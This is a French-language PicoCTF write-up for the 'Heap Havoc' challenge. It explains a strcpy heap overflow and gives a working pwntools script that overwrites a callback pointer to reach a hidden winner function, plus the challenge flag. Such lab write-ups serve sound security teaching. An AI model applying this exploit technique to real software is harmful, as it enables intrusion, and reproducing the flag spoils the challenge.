# Writeup PicoCTF - Heap Havoc

**Catégorie :** Binary Exploitation  
**Points :** 200  
**Auteur :** Yahaya Meddy

## Description
Un programme apparemment inoffensif prend deux noms comme arguments. En faisant déborder le tampon d'entrée, on peut écraser l'adresse de retour sauvegardée (ou ici, des pointeurs de fonction sur le tas) pour rediriger l'exécution vers une partie cachée du binaire qui affiche le flag.

## Analyse du Code Source
Le fichier `vuln.c` contient une structure `internet` :
```c
struct internet {
    int priority;
    char *name;
    void (*callback)();
};
```

Dans `main` :
1. Trois structures `i1`, `i2`, `i3` sont allouées avec `malloc`.
2. Pour chaque structure, un tampon `name` de 8 octets est alloué via `malloc`.
3. Les arguments `argv[1]` et `argv[2]` sont copiés dans `i1->name` et `i2->name` en utilisant `strcpy`.
4. Le programme appelle ensuite `i1->callback()` et `i2->callback()` s'ils ne sont pas nuls.

La vulnérabilité réside dans l'utilisation de `strcpy` vers un tampon de 8 octets sans vérification de taille. Comme `i1->name` est sur le tas, on peut déborder sur les structures allouées après lui.

## Stratégie d'Exploitation
L'objectif est d'écraser `i2->callback` avec l'adresse de la fonction `winner` (0x080492b6).

### Disposition du Tas (Heap Layout)
Les allocations successives placent généralement les objets dans cet ordre :
1. Structure `i1` (12 octets : priority, name_ptr, callback_ptr)
2. Tampon `i1->name` (8 octets utiles)
3. Structure `i2` (12 octets)
4. Tampon `i2->name` (8 octets utiles)

En débordant depuis `i1->name`, on rencontre :
- Des métadonnées de chunk (8 octets sur x86).
- La structure `i2`.

### Calcul de l'Offset
L'analyse dynamique a montré qu'un padding de 20 octets est nécessaire avant d'atteindre le pointeur `name` de `i2`.
Cependant, si on écrase `i2->callback` directement, on écrase aussi forcément `i2->name` (qui se trouve juste avant dans la structure). Comme le programme effectue un second `strcpy` vers `i2->name` (`strcpy(i2->name, argv[2])`), si `i2->name` contient une adresse invalide, le programme plante avant d'appeler le callback.

### Payload Final
Le payload doit :
1. Remplir le tampon initial.
2. Écraser `i2->priority` (padding).
3. **Écraser `i2->name` avec une adresse mémoire valide et accessible en écriture** (ex: `__data_start` à `0x0804c038`).
4. Écraser `i2->callback` avec l'adresse de `winner` (`0x080492b6`).

Structure du premier argument (`argv[1]`) :
`[20 octets de "A"] + [0x0804c038 (valid ptr)] + [0x080492b6 (winner)]`

## Script d'Exploitation
```python
from pwn import *

host = 'foggy-cliff.picoctf.net'
port = 60309

winner_addr = p32(0x080492b6)
valid_ptr = p32(0x0804c038) # __data_start

payload = b"A" * 20 + valid_ptr + winner_addr

r = remote(host, port)
r.sendlineafter(b"Enter two names separated by space:\n", payload + b" dummy")
print(r.recvall().decode())
```

## Flag
`picoCTF{h34p_0v3rfl0w_6299e438}`
